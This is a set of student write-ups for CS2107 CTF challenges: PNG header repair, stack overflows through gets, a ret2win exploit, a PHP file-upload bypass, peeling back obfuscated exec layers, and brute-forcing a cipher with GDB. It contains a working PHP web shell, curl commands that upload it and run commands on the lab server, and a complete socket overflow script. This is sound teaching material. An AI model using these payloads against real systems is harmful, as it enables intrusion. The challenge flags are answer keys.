# CS2107 CTF Writeups

This document contains my writeups for several CS2107 CTF challenges.

---

## E.1 – Duck

For this challenge, I used the PNG structure reference:

- <https://github.com/corkami/pics/blob/master/binary/PNG.png>

to understand how the PNG format is laid out, especially the `IHDR` chunk and how width/height are stored.

**Steps:**

1. Opened the PNG in a hex editor and located the `IHDR` chunk.
2. Doubled the **height** value (keeping it in hex).
3. When I tried to open the modified image, the viewer reported a **CRC error** because changing the height invalidated the CRC for the `IHDR` chunk.
4. I searched for a way to recompute the CRC and found the `pngcheck` CLI tool, which can compute the correct CRC for modified PNG chunks.
5. After fixing the CRC and opening the image, I saw that the original duck PNG only showed **one quarter** of the intended image.
6. I repeated the process:
   - Doubled the height again.
   - Recomputed the CRC with `pngcheck`.
   - Updated the CRC in the hex editor.

After the final correction, the full image rendered correctly and revealed the flag:

> **Flag:** `CS2107{c4n_you_s33_the_dUck_abc7d0f9}`

---

## E.2 – Bad Stack

This challenge demonstrates a classic **stack overflow** caused by the unsafe `gets` function.

Key idea:

- `gets` reads user input into a buffer **without bounds checking**.
- The program stores a `SECRET` string in memory and later compares:
  - the first `0x10` (16) characters of our input
  - to the first `0x10` characters of `SECRET`.

Because `gets` allows us to write beyond the original buffer, we can overwrite the `SECRET` buffer itself.

**Approach:**

- The original input buffer is 32 bytes.
- The `SECRET` buffer is right after it and is 16 bytes.
- If I send **48 `'a'` characters**, then:
  - The first 32 `a`s fill the input buffer.
  - The next 16 `a`s overwrite `SECRET`.

After this:

- The first 16 bytes of our input are `"aaaaaaaaaaaaaaaa"`.
- The first 16 bytes of `SECRET` (now overwritten) are also `"aaaaaaaaaaaaaaaa"`.

So the comparison passes and the program hits its win condition, printing the flag:

> **Flag:** `CS2107{5t4ck_0v3rfl0w_c4n_0v3rwr1t3_1mp0rt4nt_v4r14bl3s!}`

---

## E.3 – Self-made NextCloud

This challenge revolves around a **file upload vulnerability** in `upload.php`.

The core issue:

- The uploader only superficially checks the filename and/or extension.
- A file named `something.php.jpg` passes the check because it "looks like" a `.jpg`.
- However, the PHP interpreter still executes the `.php` content.

**Exploit steps:**

1. I created a PHP web shell named `shell.php.jpg`:

       <?php
       if (isset($_GET['cmd'])) {
           system($_GET['cmd']);
       } else {
           echo "Server is vulnerable! Use ?cmd=command to execute commands";
       }
       ?>

2. I uploaded it via `curl`:

       curl -X POST \
         -F "submit=Upload Image" \
         -F "fileToUpload=@shell.php.jpg" \
         http://cs2107-ctfd-i.comp.nus.edu.sg:5002/upload.php

3. The server stored the file under a path similar to:

   - `uploads%2F69149c407eb35_shell.php.jpg`

   which corresponds to:

   - `uploads/69149c407eb35_shell.php.jpg`

4. To run commands, I used the `cmd` parameter, URL-encoding the command:

       curl "http://cs2107-ctfd-i.comp.nus.edu.sg:5002/uploads/69149c407eb35_shell.php.jpg?cmd=ls%20-la"

   Everything after `cmd=` is the command I want, with spaces encoded as `%20`.

5. I searched for the flag and then read it:

       curl "http://cs2107-ctfd-i.comp.nus.edu.sg:5002/uploads/69149c407eb35_shell.php.jpg?cmd=cat%20/var/www/html/uploads/flag.txt"

This returned the flag:

> **Flag:** `CS2107{ph9_png_cmDbYp4ss_F1l3_upl04d_vu1n?????}`

---

## M.2 – Evil-Cowsay

This was a **ret2win** binary exploitation challenge.

- The binary used `gets` to read input into a buffer on the stack.
- There was a hidden `win()` function at a known address.
- By overflowing the buffer, I could overwrite the return address and redirect execution to `win()`.

**Finding the offset:**

1. I used `gdb` and set breakpoints in the `printcow` function:
   - Right after the `gets` assembly.
   - Before the core `printcow` logic.
2. Using:

       x/50gx $rsp

   I examined the stack and observed where my input landed.
3. From this, I determined the layout:
   - 48 bytes of padding to reach saved `RBP`.
   - 8 bytes to overwrite saved `RBP`.
   - Then the 8-byte address of `win()`.

**Exploit script:**

    import socket
    import struct

    # Target server
    HOST = "cs2107-ctfd-i.comp.nus.edu.sg"
    PORT = 5005

    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # Hardcoded win() address
    win = 0x401209

    # Build payload
    payload  = b"A" * 48
    payload += b"B" * 8
    payload += struct.pack("<Q", win)  # Little-endian 64-bit address

    # Send it
    s.send(payload + b"\n")

    # Receive response
    response = s.recv(1024)
    print("Response:", response)

    # Keep receiving until connection closes
    while True:
        try:
            data = s.recv(1024)
            if not data:
                break
            print(data.decode(), end='')
        except:
            break

    s.close()

Running this exploit redirected execution to `win()` and printed:

> **Flag:** `CS2107{c0ws4y_y0u_g0t_pwn3d…}`

---

## M.3 – Onion-haseyo

This challenge involved multiple layers of **obfuscated `exec` calls** in Python. The idea was to unwrap all the layers and see what code was really being executed.

Strategy:

- Override Python’s built-in `exec` with a custom function that:
  - Logs or prints every code object or string passed to `exec`.
  - Uses a shared global environment so the code can still run.
  - Then calls the original `exec` to keep semantics intact.

**Code:**

    import builtins
    import inspect
    import types

    real_exec = builtins.exec
    shared_globals = {}

    def trapping_exec(code, g=None, l=None):
        g = shared_globals if g is None else g
        l = g if l is None else l

        # CASE 1: code is a code object
        if isinstance(code, types.CodeType):
            try:
                src = inspect.getsource(code)
            except:
                src = "<compiled code object – source not available>"

            print("\n====== NEW EXEC LAYER (code object) ======\n")
            print(src)
            print("\n==========================================\n")

            return real_exec(code, g, l)

        # CASE 2: code is bytes or string
        if isinstance(code, bytes):
            try:
                text = code.decode("utf-8", errors="ignore")
            except:
                text = repr(code)
        else:
            text = str(code)

        print("\n====== NEW EXEC LAYER (string) ======\n")
        print(text)
        print("\n=====================================\n")

        return real_exec(code, g, l)

    builtins.exec = trapping_exec

    exec(data.decode("utf-8"), shared_globals)

By running the challenge with this patched `exec`, I could see each layer of dynamically generated code and follow the control flow all the way down to the real logic and the final flag.

> **Flag:** `CS2107{byp4ss_l4yers_0f_0bfusc4t10n}`

---

## H.1 – Why so complicated?

This challenge implemented a custom **byte-by-byte encryption** of a fixed-length (51-byte) input.

High-level behavior:

- The program reads a **51-byte input** from the user.
- It calls an `encrypt_input` function, which heavily obfuscates the transformation.
- It compares each byte of the encrypted input with a hardcoded **ENCRYPTED_FLAG** array.
- If all 51 encrypted bytes match, the program prints the flag (which is simply our input).

The challenge is that `encrypt_input` is complex and obfuscated, making it painful to fully reverse.

### Static Analysis

Using **Ghidra**:

1. I decompiled and renamed variables in `main` to understand the structure:
   - The program reads exactly 51 bytes from input.
   - Calls `encrypt_input` on that buffer.
   - Compares the encrypted result to a static `ENCRYPTED_FLAG` array.

![Ghidra Static Analysis](images/Ghidra_static_analysis.png)

2. I extracted the encrypted flag bytes from Ghidra:

       0x25,0xAF,0x7A,0x49,0x89,0xE9,0xD9,0x5B,0xAB,0xDA,0x0B,0xE6,0x09,0xF0,0x00,0x3A,
       0x41,0x5C,0x06,0x9F,0x96,0x23,0x37,0x92,0x23,0x41,0x7A,0xFD,0xEB,0x49,0xB2,0x3F,
       0x09,0x22,0xBF,0xDA,0x65,0x69,0x7F,0xB8,0xE2,0xBE,0xE4,0xF1,0x91,0x13,0x68,0x1C,
       0xAA,0xB2,0xC6

Conceptually, we want an input `flag` such that:

- `encrypt_input(flag)[i] == ENCRYPTED_FLAG[i]` for all `0 <= i < 51`.

Instead of fully reversing `encrypt_input`, I treated it as a **black-box oracle**.

### Dynamic Analysis with GDB

Using **GDB** and **GEF**:

- I looked up the address of `encrypt_input` and set a breakpoint on it.
- I observed that the encrypted bytes were written to the buffer pointed to by `RSI`.

The plan:

1. Automate GDB to:
   - Run the binary.
   - Stop at `encrypt_input`.
   - Feed a controlled 51-byte input.
   - After the function runs, read the encrypted bytes from the address in `RSI`.
2. Wrap this in a Python script (an "oracle") that:
   - Takes an input string.
   - Returns the resulting 51 encrypted bytes.

![GDB oracle Code](images/oracle_code.png)

I tested this oracle by comparing its output on simple inputs (like 51 `'A'` characters) against manual GDB sessions to confirm correctness.

### Brute-Forcing the Flag

Once the oracle worked:

- For each position `i` (0 to 50):
  - Loop over candidate ASCII characters.
  - Build an input where:
    - The `i`-th character is the candidate.
    - The rest are some fixed padding (or already discovered correct characters).
  - Run the oracle and compute the encrypted result.
  - Compare the encrypted byte at position `i` to `ENCRYPTED_FLAG[i]`.
  - When they match, record that character as the correct flag character at index `i`.

This effectively brute-forced the mapping of each output byte in `ENCRYPTED_FLAG` back to its corresponding input character, one position at a time.

I also programmed the script to reconstruct and print the entire 51-character flag once all positions were found, instead of manually piecing it together.

![Brute Force Code](images/GDB_brute_force_code.png)

### Takeaways

- I reverse engineered enough of `main` to understand:
  - Input length,
  - Where encryption is called,
  - Where the comparison happens.
- I then used **GDB scripting** plus a black-box oracle approach to automatically recover the flag without needing to fully deobfuscate `encrypt_input`.
- This required understanding:
  - Calling conventions,
  - How buffers are passed,
  - How to read memory at the right place (`RSI`).

**Performance reflection:**

- My brute-force approach was slow because for each position I potentially tried many ASCII values (up to ~95 printable characters), restarting the program each time.
- A more efficient method would:
  - Run the oracle a small number of times with carefully chosen test inputs.
  - Build a mapping of `{encrypted_byte → input_char}` for all candidate characters at once.
  - Then, for each position `i`, simply look up `ENCRYPTED_FLAG[i]` in that mapping.

Even with the slower method, the process eventually yielded the flag:

> **Flag:** `CS2107{r3v3rs1n9_str3am_c1ph3r_s1d3_ch4nn3l_4tt4ck}`
